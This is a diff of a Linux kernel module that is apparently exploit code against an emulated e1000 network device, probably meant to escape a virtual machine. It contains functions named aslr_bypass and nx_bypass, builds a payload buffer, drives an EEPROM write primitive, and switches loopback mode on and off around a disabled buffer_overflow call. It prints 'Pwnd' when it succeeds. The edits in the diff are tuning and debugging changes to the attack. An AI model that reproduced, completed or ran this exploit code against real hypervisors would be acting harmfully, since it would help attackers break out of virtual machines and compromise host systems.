@@ -61,7 +61,7 @@ static int __init e1k_init(void)
 	}
 	e1k_configure();
     //aslr_bypass();
-    nx_bypass();
+    //nx_bypass();
 	
 	pr_info("Pwnd");
 	return 0;
@@ -125,7 +125,7 @@ static void e1k_configure(void)
 		return;
 	}
 	// Payload setup
-	for (i = 0; i < PAYLOAD_LEN-50; ++i) {
+	for (i = 0; i < PAYLOAD_LEN-(0x32); ++i) {
 		tx_buffer[i] = 0x61; // Fill with garbage "a"
 	}
 
@@ -225,7 +225,7 @@ void wait_access(void)
 	set_register(EECD, eecd);
 
 	while (!(get_register(EECD) & EECD_GNT)) {
-		ssleep(1);
+		udelay(5);
 	}
 }
 
@@ -310,9 +310,13 @@ static void write_primitive(uint16_t address, uint16_t value)
 	}
 
 	// 6. We leave the "DI" bit set to "0" when we leave this routine.
-	eecd = get_register(EECD) & ~EECD_DI;
+	eecd = get_register(EECD) & ~(EECD_DI | EECD_CS);
 	set_register(EECD, eecd);
 
+	emul_clock(&eecd);
+
+	eecd = get_register(EECD) & ~EECD_REQ;
+	set_register(EECD, eecd);
 }
 
 static uint64_t aslr_bypass(void)
@@ -404,14 +408,12 @@ static void nx_bypass(void)
 	pr_info("##### Stage 2 #####\n");
 
 	// Set loopback mode
-	uint32_t rctl = get_register(RCTL) | RCTL_LBM_MAC | RCTL_LBM_SLP;
+	uint32_t rctl = get_register(RCTL);// | RCTL_LBM_MAC | RCTL_LBM_SLP;
 	set_register(RCTL, rctl);
 
 	//buffer_overflow();
 
 	// Disable loopback mode
-	rctl = get_register(RCTL) & ~RCTL_LBM_MAC & ~RCTL_LBM_SLP;
+	rctl = get_register(RCTL);// & ~RCTL_LBM_MAC & ~RCTL_LBM_SLP;
 	set_register(RCTL, rctl);
-
-	
 }
